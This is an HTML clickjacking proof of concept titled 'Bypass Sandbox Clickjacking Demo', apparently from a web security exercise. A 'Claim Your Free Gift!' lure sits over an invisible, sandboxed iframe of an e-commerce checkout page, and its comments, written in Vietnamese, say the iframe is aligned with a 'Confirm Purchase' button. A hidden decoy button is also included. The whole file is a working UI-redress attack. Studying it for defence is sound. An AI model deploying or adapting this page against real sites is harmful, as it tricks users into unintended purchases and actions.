<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Sandbox Clickjacking Demo</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            z-index: 100;
            background-color: rgba(255, 255, 255, 0.9);
        }
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0; /* Hoàn toàn trong suốt */
            z-index: 2;
            border: none;
        }
        .clickButton {
            position: absolute;
            top: 450px; /* Căn chỉnh với 'Confirm Purchase' */
            left: 225px;
            z-index: 1;
            font-size: 18px;
            padding: 10px;
            color: red;
            cursor: pointer;
            font-weight: bold;
            opacity: 0; /* Ẩn hoàn toàn */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Free Gift!</h1>
        <p>Click the button below to get your exclusive offer!</p>
    </div>
    <iframe sandbox="allow-forms allow-same-origin" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
    <div class="clickButton" onclick="alert('You clicked the fake button!')">Click me</div>
</body>
</html>
